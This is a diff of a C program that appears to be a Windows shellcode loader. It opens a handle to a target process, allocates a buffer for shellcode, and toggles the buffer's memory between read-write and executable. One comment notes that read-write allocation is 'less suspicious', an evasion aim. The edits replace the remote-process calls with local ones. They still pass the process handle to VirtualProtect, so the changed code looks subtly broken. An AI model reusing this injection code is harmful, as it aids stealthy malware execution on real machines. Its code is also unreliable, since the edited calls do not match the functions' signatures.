@@ -49,7 +49,7 @@ int main() {
   printf("[*] Successfully opened handle to PID: %u\n", pid);
   
   // Allocate a block of memory that can store our shellcode, RW memory protection is slightly less suspicious
-  LPVOID bufferAddress = VirtualAllocEx(pHandle, NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+  LPVOID bufferAddress = VirtualAlloc(NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
   if (bufferAddress == NULL) {
       printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
       return -1;
@@ -67,7 +67,7 @@ int main() {
   
   // Update the memory protection value from RW to RWX
   DWORD lpOldProtect = NULL;
-  BOOL updateMemoryProtection = VirtualProtectEx(pHandle, bufferAddress, sizeof buf, PAGE_EXECUTE_READWRITE, &lpOldProtect);
+  BOOL updateMemoryProtection = VirtualProtect(pHandle, bufferAddress, sizeof buf, PAGE_EXECUTE_READWRITE, &lpOldProtect);
   if(updateMemoryProtection == false) {
       printf("[ERROR] Failed to update memory protection (updating from RW to RWX)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
       VirtualFree(bufferAddress, 0, MEM_RELEASE);
@@ -87,7 +87,7 @@ int main() {
   WaitForSingleObject(tHandle, INFINITE);
 
   // Update the memory protection value from RWX to RW
-  updateMemoryProtection = VirtualProtectEx(pHandle, bufferAddress, sizeof buf, PAGE_READWRITE, &lpOldProtect);
+  updateMemoryProtection = VirtualProtect(pHandle, bufferAddress, sizeof buf, PAGE_READWRITE, &lpOldProtect);
   if(updateMemoryProtection == false) {
       printf("[ERROR] Failed to update memory protection (toggling back to RW)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
       VirtualFree(bufferAddress, 0, MEM_RELEASE);
